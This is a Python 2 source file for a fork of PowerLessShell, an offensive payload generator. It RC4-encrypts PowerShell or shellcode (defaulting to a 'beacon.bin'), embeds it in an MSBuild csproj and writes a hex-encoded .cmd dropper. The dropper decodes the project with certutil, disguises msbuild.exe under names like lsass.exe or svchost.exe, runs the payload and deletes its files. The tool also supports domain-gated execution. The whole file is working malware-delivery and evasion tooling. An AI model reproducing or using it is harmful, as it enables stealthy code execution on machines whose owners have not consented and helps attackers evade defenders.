#!/usr/bin/env python2
# Author: Mr.Un1k0d3r - RingZer0 Team 2017 / blark's fork

from __future__ import print_function
import random
import string
import base64
import sys
import re
import os
import click
import ptpdb

TEMPLATE = "include/template-"

class Generator:
    def __init__(self, known_process):
        self.error = 0
        self.banner()
        self.chunk_size = 1024
        self.known_process = known_process

    def print_error(self, error):
        click.secho("[!] {0}".format(error), fg="red", bold=True)

    def banner(self):
        click.secho( "PowerLessShell - More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team / blark's fork", fg="white", bold=True)
        click.secho("            ___")
        click.secho("        .-\"; ! ;\"-.")
        click.secho("      .'!  : | :  !`.")
        click.secho("     /\  ! : ! : !  /\\")
        click.secho("    /\ |  ! :|: !  | /\\")
        click.secho("   (  \ \ ; :!: ; / /  )")
        click.secho("  ( `. \ | !:|:! | / .' )")
        click.secho("  (`. \ \ \!:|:!/ / / .')")
        click.secho("   \ `.`.\ |!|! |/,'.' /")
        click.secho("    `._`.\\\!!!// .'_.'")
        click.secho("       `.`.\\|//.'.'")
        click.secho("        |`._`n'_.'|")
        click.secho("        `----^----\"\n")

    def set_template(self, path):
        self.data = self.load_file(path, True)
        self.rand_vars()

    def gen_str(self, size):
        return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size))

    def gen_process(self):
        name = [
            "csrss.exe", "explorer.exe", "iexplore.exe", "firefox.exe",
            "chrome.exe", "lsass.exe", "services.exe", "smss.exe",
            "spoolsv.exe", "svchost.exe", "winlogon.exe", "wininit.exe",
            "taskmgr.exe", "conhost.exe", "OUTLOOK.exe", "WINWORD.exe",
            "EXCEL.exe"
        ]
        return name[random.randrange(0, len(name) - 1)]

    def rand_vars(self):
        for i in reversed(range(1, 50)):
            self.data = self.data.replace(
                "VAR" + str(i), self.gen_str(random.randrange(5, 25)))

    def get_output(self):
        return self.data

    def gen_rc4_key(self, size):
        return os.urandom(size)

    def format_rc4_key(self, key):
        return "0x" + ", 0x".join(re.findall("..", key.encode("hex")))

    def load_file(self, path, fatal_error=False):
        data = ""
        try:
            data = open(path, "rb").read()
        except:
            self.error = 1
            self.print_error("%s file not found." % path)
            if fatal_error:
                exit(0)
        return data

    def gen_final_cmd(self, csproj):
        size = 0
        filepath = []
        for i in xrange(3):
            filepath.append(self.gen_str(random.randrange(8, 18)))

        # The cmd file first does a quck check for write access to the msbuild folder,
        # if its unavailable use %temp% working directory instead. Next, check if the
        # payload has already been decoded and skip re-creating the file if it exists.
        payload = (
            "@ECHO OFF\r\n"
            "set w=0 && set p=\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\\r\n"
            "copy /Y NUL %p%\\{2} > NUL 2>&1 && set w=1\r\n"
            "IF %w%==1 (del %p%\\{2}) ELSE (set p=%temp%)\r\n"
            "set f0=%p%\\{0} && set f1=%p%\\{1}\r\n"
            "IF EXIST %f1% (GOTO RUN)\r\n").format(filepath[0], filepath[1], filepath[2])

        data = csproj.encode("hex")
        for index, chunk in enumerate(re.findall("." * self.chunk_size, data)):
            payload += "echo {0} {1} %f0%\r\n".format(chunk, ">" if index == 0 else ">>")
            size += self.chunk_size
        if len(data) > size:
            payload += "echo {0} >> %f0%".format(
                data[(len(data) - size) * -1:])
        if self.known_process:
            msbuild = self.gen_process()
        else:
            msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
        # Decode paylod, copy msbuild, launch payload, delete files
        payload += (
            "\r\ncertutil -decodehex %f0% %f1%\r\n"
            "del %f0%\r\n"
            "IF %w%==1 (copy %p%\\msbuild.exe %p%\\{0})\r\n"
            ":RUN\r\n"
            "IF %w%==1 (%p%\\{0} %f1%) ELSE (\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\msbuild.exe %f1%)\r\n"
            "del %f1%").format(msbuild)
        return payload

    def set_condition(self, data, value=""):
        if value == "":
            return data.replace("[CONDITION]", "")
        else:
            return data.replace(
                "[CONDITION]",
                ' Condition="\'$(USERDOMAIN)\'==\'%s\'"' % value)

class RC4:
    def KSA(self, key):
        keylength = len(key)
        S = range(256)
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % keylength]) % 256
            S[i], S[j] = S[j], S[i]
        return S

    def PRGA(self, S):
        i = 0
        j = 0
        while True:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]

            K = S[(S[i] + S[j]) % 256]
            yield K

    def Encrypt(self, plaintext, key):
        output = ""
        key = [ord(c) for c in key]
        S = self.KSA(key)
        keystream = self.PRGA(S)
        for c in plaintext:
            output = output + chr(ord(c) ^ keystream.next())
        return output

def set_kind(ctx, param, value):
    kind = filter(lambda x: x.name == 'kind', ctx.command.params)[0]
    _, file_ext = os.path.splitext(value.name)
    if file_ext == '.ps1':
        kind.default = 'ps'
    elif file_ext == '.bin':
        kind.default = 'sc'
    else:
        kind.required = True
    return value

@click.command()
@click.argument('payload', type=click.File('rb'), default="beacon.bin", callback=set_kind)
@click.argument('outfile', type=click.File('wb'), default="./output/payload.cmd")
@click.option('--kind', '-k', type=click.Choice(['ps', 'sc']), help="Powershell (ps) or shellcode (sc) input file, script tries to autodetect based on extension (ps1=powershell, bin=shellcode).")
@click.option('--known-process', is_flag=True, default=False, help="Disguise msbuild as a common Windows executable")
@click.option('--domain', '-d', default='', help="Domain name to check for prior to running payload")
@click.option('--csproj-out', is_flag=True, default=False, help="Also output the csproj file")
def main(payload, outfile, kind, known_process, domain, csproj_out):
    """
    Accepts a powershell script or raw shellcode, then encrypts with RC4, base64
    encodes, and sticks into a csproj template to be executed as inline task on
    the client side. The csproj is then hex encoded and output as a cmd file to
    be launched on a target machine using wmi or schtask, etc. The command file
    uses certutil to decode the csproj, renames msbuild (if admin), and then launch
    the payload.

    \b
    [PAYLOAD] defaults to ./beacon.bin
    [OUTFILE] defaults to ./output/payload.cmd
    """

    output_type = {'sc': 'shellcode', 'ps': 'powershell'}
    data = payload.read()
    gen = Generator(known_process=known_process)
    click.secho("Using payload file {0}, type {1}".format(payload.name, output_type[kind]))
    if kind == 'sc':
        template_path = TEMPLATE + "shellcode.csproj"
    else:
        template_path = TEMPLATE + "powershell.csproj"
    gen.set_template(template_path)
    rc4 = RC4()
    key = gen.gen_rc4_key(32)
    cipher = base64.b64encode(rc4.Encrypt(data, key))
    csproj = gen.get_output()
    csproj = csproj.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
    condition = domain
    csproj = gen.set_condition(csproj, condition)
    if csproj_out:
        f = '{0}/{1}.csproj'.format(os.path.dirname(outfile.name) or ".", os.path.splitext(os.path.basename(outfile.name))[0])
        with open(f, 'wb') as csproj_file:
            click.secho("Writing csproj file {0}".format(f))
            csproj_file.write(csproj)
    else:
        click.secho("Not writing csproj to disk, if you want this use the --csproj switch")
    cmd = gen.gen_final_cmd(csproj)
    click.secho("Writing {}".format(outfile.name))
    outfile.write(cmd)
    outfile.flush()

if __name__ == "__main__":
    main()
